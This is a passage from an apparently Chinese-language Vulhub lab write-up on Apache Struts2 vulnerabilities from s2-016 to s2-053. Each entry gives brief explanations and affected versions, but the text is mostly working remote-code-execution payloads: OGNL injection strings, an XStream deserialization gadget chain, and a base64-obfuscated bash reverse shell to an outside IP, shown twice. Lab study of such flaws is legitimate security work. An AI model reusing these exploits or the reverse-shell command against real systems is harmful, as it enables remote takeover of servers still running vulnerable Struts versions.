+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">24</span>%<span class="number">7</span>B%<span class="number">23</span>context%<span class="number">5</span>B%<span class="number">27</span>xwork.MethodAccessor.denyMethodExecution%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>Dfalse%<span class="number">2</span>C%<span class="number">23</span>m%<span class="number">3</span>D%<span class="number">23</span>_memberAccess.getClass%<span class="number">28</span>%<span class="number">29.</span>getDeclaredField%<span class="number">28</span>%<span class="number">27</span>allowStaticMethodAccess%<span class="number">27</span>%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23</span>m.setAccessible%<span class="number">28</span><span class="keyword">true</span>%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23</span>m.set%<span class="number">28</span>%<span class="number">23</span>_memberAccess%<span class="number">2</span>Ctrue%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23</span>q%<span class="number">3</span>D@org.apache.commons.io.IOUtils@toString%<span class="number">28</span>@java.lang.Runtime@getRuntime%<span class="number">28</span>%<span class="number">29.</span>exec%<span class="number">28</span>%<span class="number">27</span>whoami%<span class="number">27</span>%<span class="number">29.</span>getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23</span>q%<span class="number">7</span>D.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1602038963485.png" alt="1602038963485"></p>
+<p>poc2</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">24</span>%<span class="number">7</span>B%<span class="number">23</span>context%<span class="number">5</span>B%<span class="number">27</span>xwork.MethodAccessor.denyMethodExecution%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>Dfalse%<span class="number">2</span>C%<span class="number">23</span>m%<span class="number">3</span>D%<span class="number">23</span>_memberAccess.getClass%<span class="number">28</span>%<span class="number">29.</span>getDeclaredField%<span class="number">28</span>%<span class="number">27</span>allowStaticMethodAccess%<span class="number">27</span>%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23</span>m.setAccessible%<span class="number">28</span><span class="keyword">true</span>%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23</span>m.set%<span class="number">28</span>%<span class="number">23</span>_memberAccess%<span class="number">2</span>Ctrue%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23</span>q%<span class="number">3</span>D@org.apache.commons.io.IOUtils@toString%<span class="number">28</span>@java.lang.Runtime@getRuntime%<span class="number">28</span>%<span class="number">29.</span>exec%<span class="number">28</span>%<span class="number">27</span>ls%<span class="number">27</span>%<span class="number">29.</span>getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">23</span>q%<span class="number">7</span>D.action</span><br></pre></td></tr></table></figure>
+
+<h1 id="s2-016"><a href="#s2-016" class="headerlink" title="s2-016"></a>s2-016</h1><p>原理：问题主要出在对于特殊URL处理中，redirect与redirectAction后面跟上Ognl表达式会被服务器执行。</p>
+<p>影响版本：Struts 2.0.0 – 2.3.15</p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.action?redirect:%<span class="number">24</span>%<span class="number">7</span>b%<span class="number">23</span>%<span class="number">61</span>%<span class="number">3</span>d%<span class="number">28</span>%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">77</span>%<span class="number">20</span>%<span class="number">6</span>a%<span class="number">61</span>%<span class="number">76</span>%<span class="number">61</span>%<span class="number">2</span>e%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">67</span>%<span class="number">2</span>e%<span class="number">50</span>%<span class="number">72</span>%<span class="number">6</span>f%<span class="number">63</span>%<span class="number">65</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">42</span>%<span class="number">75</span>%<span class="number">69</span>%<span class="number">6</span>c%<span class="number">64</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">28</span>%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">77</span>%<span class="number">20</span>%<span class="number">6</span>a%<span class="number">61</span>%<span class="number">76</span>%<span class="number">61</span>%<span class="number">2</span>e%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">67</span>%<span class="number">2</span>e%<span class="number">53</span>%<span class="number">74</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">67</span>%<span class="number">5</span>b%<span class="number">5</span>d%<span class="number">7</span>b%<span class="number">27</span>%<span class="number">6</span>c%<span class="number">73</span>%<span class="number">27</span>%<span class="number">2</span>c%<span class="number">27</span>%<span class="number">2</span>f%<span class="number">27</span>%<span class="number">7</span>d%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2</span>e%<span class="number">73</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">72</span>%<span class="number">74</span>%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>%<span class="number">62</span>%<span class="number">3</span>d%<span class="number">23</span>%<span class="number">61</span>%<span class="number">2</span>e%<span class="number">67</span>%<span class="number">65</span>%<span class="number">74</span>%<span class="number">49</span>%<span class="number">6</span>e%<span class="number">70</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">53</span>%<span class="number">74</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">6</span>d%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>%<span class="number">63</span>%<span class="number">3</span>d%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">77</span>%<span class="number">20</span>%<span class="number">6</span>a%<span class="number">61</span>%<span class="number">76</span>%<span class="number">61</span>%<span class="number">2</span>e%<span class="number">69</span>%<span class="number">6</span>f%<span class="number">2</span>e%<span class="number">49</span>%<span class="number">6</span>e%<span class="number">70</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">53</span>%<span class="number">74</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">6</span>d%<span class="number">52</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">64</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">28</span>%<span class="number">23</span>%<span class="number">62</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>%<span class="number">64</span>%<span class="number">3</span>d%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">77</span>%<span class="number">20</span>%<span class="number">6</span>a%<span class="number">61</span>%<span class="number">76</span>%<span class="number">61</span>%<span class="number">2</span>e%<span class="number">69</span>%<span class="number">6</span>f%<span class="number">2</span>e%<span class="number">42</span>%<span class="number">75</span>%<span class="number">66</span>%<span class="number">66</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">64</span>%<span class="number">52</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">64</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">28</span>%<span class="number">23</span>%<span class="number">63</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>%<span class="number">65</span>%<span class="number">3</span>d%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">77</span>%<span class="number">20</span>%<span class="number">63</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">72</span>%<span class="number">5</span>b%<span class="number">35</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">5</span>d%<span class="number">2</span>c%<span class="number">23</span>%<span class="number">64</span>%<span class="number">2</span>e%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">64</span>%<span class="number">28</span>%<span class="number">23</span>%<span class="number">65</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>%<span class="number">6</span>d%<span class="number">61</span>%<span class="number">74</span>%<span class="number">74</span>%<span class="number">3</span>d%<span class="number">23</span>%<span class="number">63</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%<span class="number">74</span>%<span class="number">2</span>e%<span class="number">67</span>%<span class="number">65</span>%<span class="number">74</span>%<span class="number">28</span>%<span class="number">27</span>%<span class="number">63</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">2</span>e%<span class="number">6</span>f%<span class="number">70</span>%<span class="number">65</span>%<span class="number">6</span>e%<span class="number">73</span>%<span class="number">79</span>%<span class="number">6</span>d%<span class="number">70</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">79</span>%<span class="number">2</span>e%<span class="number">78</span>%<span class="number">77</span>%<span class="number">6</span>f%<span class="number">72</span>%<span class="number">6</span>b%<span class="number">32</span>%<span class="number">2</span>e%<span class="number">64</span>%<span class="number">69</span>%<span class="number">73</span>%<span class="number">70</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">63</span>%<span class="number">68</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">2</span>e%<span class="number">48</span>%<span class="number">74</span>%<span class="number">74</span>%<span class="number">70</span>%<span class="number">53</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">76</span>%<span class="number">6</span>c%<span class="number">65</span>%<span class="number">74</span>%<span class="number">52</span>%<span class="number">65</span>%<span class="number">73</span>%<span class="number">70</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">73</span>%<span class="number">65</span>%<span class="number">27</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>%<span class="number">6</span>d%<span class="number">61</span>%<span class="number">74</span>%<span class="number">74</span>%<span class="number">2</span>e%<span class="number">67</span>%<span class="number">65</span>%<span class="number">74</span>%<span class="number">57</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>e%<span class="number">70</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">74</span>%<span class="number">6</span>c%<span class="number">6</span>e%<span class="number">28</span>%<span class="number">23</span>%<span class="number">65</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>%<span class="number">6</span>d%<span class="number">61</span>%<span class="number">74</span>%<span class="number">74</span>%<span class="number">2</span>e%<span class="number">67</span>%<span class="number">65</span>%<span class="number">74</span>%<span class="number">57</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>e%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">75</span>%<span class="number">73</span>%<span class="number">68</span>%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>%<span class="number">6</span>d%<span class="number">61</span>%<span class="number">74</span>%<span class="number">74</span>%<span class="number">2</span>e%<span class="number">67</span>%<span class="number">65</span>%<span class="number">74</span>%<span class="number">57</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>e%<span class="number">63</span>%<span class="number">6</span>c%<span class="number">6</span>f%<span class="number">73</span>%<span class="number">65</span>%<span class="number">28</span>%<span class="number">29</span>%<span class="number">7</span>d</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.action?redirect:$&#123;<span class="comment">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;'ls','/'&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1602039230314.png" alt="1602039230314"></p>
+<p>s2-016之前得洞好像都可以使用s2-16进行利用，工具一把梭</p>
+<h1 id="s2-032"><a href="#s2-032" class="headerlink" title="s2-032"></a>s2-032</h1><p>影响版本：</p>
+<p>Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</p>
+<p>原理</p>
+<p><code>当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。
+ method:&lt;name&gt; Action 前缀去调用声明为 public 的函数，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会。</code></p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:%<span class="number">23</span>_memberAccess%<span class="number">3</span>D%<span class="number">40</span>ognl.OgnlContext%<span class="number">40</span>DEFAULT_MEMBER_ACCESS%<span class="number">2</span>C%<span class="number">23</span>res%<span class="number">3</span>D%<span class="number">40</span>org.apache.struts2.ServletActionContext%<span class="number">40</span>getResponse()%<span class="number">2</span>C%<span class="number">23</span>res.setCharacterEncoding(%<span class="number">23</span>parameters.encoding%<span class="number">5</span>B0%<span class="number">5</span>D)%<span class="number">2</span>C%<span class="number">23</span>w%<span class="number">3</span>D%<span class="number">23</span>res.getWriter()%<span class="number">2</span>C%<span class="number">23</span>a%<span class="number">3</span>Dnew%<span class="number">20</span>java.util.Scanner(%<span class="number">40</span>java.lang.Runtime%<span class="number">40</span>getRuntime().exec(%<span class="number">23</span>parameters.cmd%<span class="number">5</span>B0%<span class="number">5</span>D).getInputStream()).useDelimiter(%<span class="number">23</span>parameters.d%<span class="number">5</span>B0%<span class="number">5</span>D)%<span class="number">2</span>C%<span class="number">23</span>str%<span class="number">3</span>D%<span class="number">23</span>a.hasNext()%<span class="number">3</span>F%<span class="number">23</span>a.next()%<span class="number">3</span>A%<span class="number">23</span>parameters.dd%<span class="number">5</span>B0%<span class="number">5</span>D%<span class="number">2</span>C%<span class="number">23</span>w.<span class="keyword">print</span>(%<span class="number">23</span>str)%<span class="number">2</span>C%<span class="number">23</span>w.close()%<span class="number">2</span>C%<span class="number">23</span>request.toString&amp;cmd=ls&amp;dd=%<span class="number">20</span>&amp;d=____A&amp;encoding=UTF<span class="number">-8</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1602040329106.png" alt="1602040329106"></p>
+<p>工具<br>反弹shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="keyword">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTA0LjE3Mi83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/10/07/vulhub-struts2/1602053557111.png" alt="1602053557111"></p>
+<h1 id="s2-045"><a href="#s2-045" class="headerlink" title="s2-045"></a>s2-045</h1><p>原理：在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
+<p>影响版本：</p>
+<ul>
+<li>Struts2.3.5 – 2.3.31</li>
+<li>Struts2.5 – 2.5.10</li>
+</ul>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(<span class="comment">#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"pwd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>抓包，在content-type里面加上payload </p>
+<p><img src="/2020/10/07/vulhub-struts2/1602055778591.png" alt="1602055778591"></p>
+<p>反弹shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="keyword">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTA0LjE3Mi83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="s2-046"><a href="#s2-046" class="headerlink" title="s2-046"></a>s2-046</h1><p>该漏洞与之前S2-045漏洞成因及原理一样（CVE漏洞编号是同一个），只是漏洞利用的字段发生了改变。</p>
+<p>影响的版本</p>
+<ul>
+<li>Struts 2.3.5 – Struts 2.3.31</li>
+<li>Struts 2.5 – Struts 2.5.10</li>
+</ul>
+<p>burp抓包，将filename里面填写</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="comment">#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)&#125;\x00b</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1602063578549.png" alt="1602063578549"></p>
+<p> 在hex里找到b之前一个符号，使用00截断</p>
+<p><img src="/2020/10/07/vulhub-struts2/1602063644370.png" alt="1602063644370"></p>
+<p><img src="/2020/10/07/vulhub-struts2/1602063944289.png" alt="1602063944289"></p>
+<p>命令执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(<span class="comment">#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;b</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1602064063432.png" alt="1602064063432"></p>
+<h1 id="s2-048"><a href="#s2-048" class="headerlink" title="s2-048"></a>s2-048</h1><p>原理：Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
+<p>影响版本：Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p>
+<p>访问/integration/saveGangster.action页面</p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(<span class="comment">#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream())).(#q)&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1602064773788.png" alt="1602064773788"></p>
+<p>工具检测</p>
+<p><img src="/2020/10/07/vulhub-struts2/1602064862767.png" alt="1602064862767"></p>
+<h1 id="s2-052"><a href="#s2-052" class="headerlink" title="s2-052"></a>s2-052</h1><p>原理：Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
+<p>影响版本：</p>
+<ul>
+<li>Struts 2.1.2 - Struts 2.3.33</li>
+<li>Struts 2.5 - Struts 2.5.12</li>
+</ul>
+<p>点击edit进入到<a href="http://192.168.102.128:8080/orders/3/edit" target="_blank" rel="noopener">http://192.168.102.128:8080/orders/3/edit</a>页面下，点击一下submit</p>
+<p><img src="/2020/10/07/vulhub-struts2/1602065036666.png" alt="1602065036666"></p>
+<p>点击submit提交抓包</p>
+<p>post传入poc并修改<code>Content-Type: application/xml</code></p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">&lt;entry&gt;</span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">&lt;flags&gt;<span class="number">0</span>&lt;/flags&gt;</span><br><span class="line">&lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"&gt;</span><br><span class="line">&lt;dataHandler&gt;</span><br><span class="line">&lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"&gt;</span><br><span class="line">&lt;is class="javax.crypto.CipherInputStream"&gt;</span><br><span class="line">&lt;cipher class="javax.crypto.NullCipher"&gt;</span><br><span class="line">&lt;initialized&gt;<span class="keyword">false</span>&lt;/initialized&gt;</span><br><span class="line">&lt;opmode&gt;<span class="number">0</span>&lt;/opmode&gt;</span><br><span class="line">&lt;serviceIterator class="javax.imageio.spi.FilterIterator"&gt;</span><br><span class="line">&lt;iter class="javax.imageio.spi.FilterIterator"&gt;</span><br><span class="line">&lt;iter class="java.util.Collections$EmptyIterator"/&gt;</span><br><span class="line">&lt;next class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">&lt;command&gt;</span><br><span class="line">&lt;string&gt;touch&lt;/string&gt;</span><br><span class="line">&lt;string&gt;/tmp/<span class="number">11112222333344445</span>&lt;/string&gt;</span><br><span class="line">&lt;/command&gt;</span><br><span class="line">&lt;redirectErrorStream&gt;<span class="keyword">false</span>&lt;/redirectErrorStream&gt;</span><br><span class="line">&lt;/next&gt;</span><br><span class="line">&lt;/iter&gt;</span><br><span class="line">&lt;filter class="javax.imageio.ImageIO$ContainsFilter"&gt;</span><br><span class="line">&lt;method&gt;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span>&gt;<span class="title">java</span>.<span class="title">lang</span>.<span class="title">ProcessBuilder</span>&lt;/<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">name</span>&gt;<span class="title">start</span>&lt;/<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">parameter</span>-<span class="title">types</span>/&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">method</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">name</span>&gt;<span class="title">foo</span>&lt;/<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">filter</span>&gt;</span></span><br><span class="line">&lt;next class="string"&gt;foo&lt;/next&gt;</span><br><span class="line">&lt;/serviceIterator&gt;</span><br><span class="line">&lt;lock/&gt;</span><br><span class="line">&lt;/cipher&gt;</span><br><span class="line">&lt;input class="java.lang.ProcessBuilder$NullInputStream"/&gt;</span><br><span class="line">&lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">&lt;done&gt;<span class="keyword">false</span>&lt;/done&gt;</span><br><span class="line">&lt;ostart&gt;<span class="number">0</span>&lt;/ostart&gt;</span><br><span class="line">&lt;ofinish&gt;<span class="number">0</span>&lt;/ofinish&gt;</span><br><span class="line">&lt;closed&gt;<span class="keyword">false</span>&lt;/closed&gt;</span><br><span class="line">&lt;/is&gt;</span><br><span class="line">&lt;consumed&gt;<span class="keyword">false</span>&lt;/consumed&gt;</span><br><span class="line">&lt;/dataSource&gt;</span><br><span class="line">&lt;transferFlavors/&gt;</span><br><span class="line">&lt;/dataHandler&gt;</span><br><span class="line">&lt;dataLen&gt;<span class="number">0</span>&lt;/dataLen&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span><br><span class="line">&lt;/entry&gt;</span><br><span class="line">&lt;entry&gt;</span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span><br><span class="line">&lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1602065528480.png" alt="1602065528480"></p>
+<p>进入容器查看，创建成功</p>
+<p><img src="/2020/10/07/vulhub-struts2/1602065637076.png" alt="1602065637076"></p>
+<h1 id="s2-053"><a href="#s2-053" class="headerlink" title="s2-053"></a>s2-053</h1><p>原理：Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
+<p>影响版本：</p>
+<ul>
+<li>Struts 2.0.1-2.3.33</li>
+<li>Struts 2.5-2.5.10</li>
+</ul>
+<p>访问<a href="http://192.168.102.128/hello，submit抓包" target="_blank" rel="noopener">http://192.168.102.128/hello，submit抓包</a></p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(<span class="comment">#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds=(&#123;'/bin/bash','-c','id'&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span></span><br><span class="line"></span><br><span class="line">urlencode=====&gt;</span><br><span class="line"></span><br><span class="line">%<span class="number">25</span>%<span class="number">7</span>B%<span class="number">28</span>%<span class="number">23</span>dm%<span class="number">3</span>D%<span class="number">40</span>ognl.OgnlContext%<span class="number">40</span>DEFAULT_MEMBER_ACCESS%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>_memberAccess%<span class="number">3</span>F%<span class="number">28</span>%<span class="number">23</span>_memberAccess%<span class="number">3</span>D%<span class="number">23</span>dm%<span class="number">29</span>%<span class="number">3</span>A%<span class="number">28</span>%<span class="number">28</span>%<span class="number">23</span>container%<span class="number">3</span>D%<span class="number">23</span>context%<span class="number">5</span>B%<span class="number">27</span>com.opensymphony.xwork2.ActionContext.container%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>ognlUtil%<span class="number">3</span>D%<span class="number">23</span>container.getInstance%<span class="number">28</span>%<span 